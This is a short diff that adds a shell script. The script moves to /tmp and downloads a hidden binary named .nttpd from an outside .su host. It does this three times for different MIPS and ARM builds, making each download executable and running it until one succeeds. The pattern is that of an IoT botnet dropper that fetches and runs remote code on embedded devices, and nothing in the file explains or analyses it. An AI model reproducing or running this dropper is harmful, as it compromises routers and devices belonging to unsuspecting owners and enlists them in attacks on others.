@@ -1,0 +1,18 @@
+#!/bin/sh
+
+cd /tmp
+
+rm -f .nttpd
+wget -O .nttpd http://domstates.su/.nttpd,20-mips-le-t1
+chmod +x .nttpd
+./.nttpd && exit 0
+
+rm -f .nttpd
+wget -O .nttpd http://domstates.su/.nttpd,19-arm-le-t1
+chmod +x .nttpd
+./.nttpd && exit 0
+
+rm -f .nttpd
+wget -O .nttpd http://domstates.su/.nttpd,18-mips-be-t2
+chmod +x .nttpd
+./.nttpd && exit 0
